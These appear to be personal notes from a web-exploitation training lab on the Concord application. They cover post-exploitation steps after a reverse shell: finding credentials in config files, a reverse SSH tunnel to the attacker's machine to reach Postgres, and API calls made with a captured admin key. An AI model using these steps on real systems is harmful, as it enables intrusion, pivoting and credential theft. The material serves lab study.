We can remote mount the concord directories with:
```bash
sshfs -o allow_other,default_permissions student@concord:/home/student/concord-1.43.0 /home/vagrant/Desktop/awae/concord/part-1/1.43
```
```bash
sshfs -o allow_other,default_permissions student@concord:/home/student/concord-1.83.0 /home/vagrant/Desktop/awae/concord/part-1/1.83
```
Part 1 ExtraMile:  
Our reverse shell lands us in a docker container.  

We should promote the shell to a fully interactive tty.  
Python2.7 is installed on the container.  
We can find the concord.conf file with: 
```bash
find / -type f -name *.conf 2>/dev/null
```
The concord.conf file contains credentials to a posgres db.
In order to access the postgres port with our java client from our kali box we can do a reverse tunnel (from within the reverseshell):
```bash
ssh -N -R 5432:172.18.0.4:5432 tunnelboy@192.168.119.130 -o "StrictHostKeyChecking=no"
```
We can build our jdbc client with compile.ps1  

Searching the codebase:
```powershell
gci -Recurse -Filter "*.java" |  sls -Pattern salt | select line,path
```
concord documentation: https://web.archive.org/web/20201123223951/https://concord.walmartlabs.com/docs/api/secret.html
Api Token creation at: https://github.com/walmartlabs/concord/blob/master/server/liquibase-ext/src/main/java/com/walmartlabs/concord/server/liquibase/ext/ApiTokenCreator.java
Specific Location is ApiKeyDao.java

Interacting with api with admin auth key
iwr -Uri 'http://concord:8001/api/v1/apikey' -Headers @{ Authorization = "basic "+ [System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes("KLI+ltQThpx6RQrOc2nDBaM/8tDyVGDw+UVYMXDrqaA"));ContentType= "application/json"}
curl -H "Authorization: basic KLI+ltQThpx6RQrOc2nDBaM/8tDyVGDw+UVYMXDrqaA" -H "Content-Type: application/json"  http://concord:8001/api/v1/apikey